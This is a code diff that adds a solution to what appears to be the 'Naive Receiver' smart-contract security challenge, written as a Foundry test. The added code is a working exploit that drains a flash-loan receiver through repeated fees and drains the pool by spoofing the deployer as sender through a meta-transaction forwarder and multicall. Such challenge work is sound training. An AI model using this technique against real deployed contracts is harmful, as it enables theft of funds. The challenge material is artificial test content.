@@ -77,7 +77,51 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // - Prepare call data for 10 flashloans(drain the user) and 1 withdrawals(drain the protocol) 
+        bytes[] memory callDatas = new bytes[](11);
+
+        // - Encode the call on behalf of NaiveReceiver 
+        for (uint i = 0; i < 10; i++){
+            callDatas[i] = abi.encodeCall(
+                NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x")
+            );
+        }
+
+        // - Encode the withdrawal call, Exploit the access control vuln by passing the req through the forwarderand setting 
+        //   then deployer as sender in the last 20 bytes 
+        callDatas[10] = abi.encodePacked(abi.encodeCall(
+            NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+        ), bytes32(uint256(uint160(deployer))));
+
+        // - Encode the Multicall 
+        bytes memory multicallData = abi.encodeCall(pool.multicall , callDatas);
+
+        // - Create Forwarder request 
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            player,
+            address(pool),
+            0,
+            gasleft(),
+            forwarder.nonces(player),
+            multicallData,
+            1 days
+        );
+
+        // - Hash the request 
+        bytes32 requestHash = keccak256(
+            abi.encodePacked(
+                "\x19\x01",
+                forwarder.domainSeparator(),
+                forwarder.getDataHash(request)
+            )
+        );
+
+        // - Sign the req 
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+        bytes memory signature = abi.encodePacked(v,r,s);
+
+        // - Execute the req 
+        forwarder.execute(request, signature);
     }
 
     /**
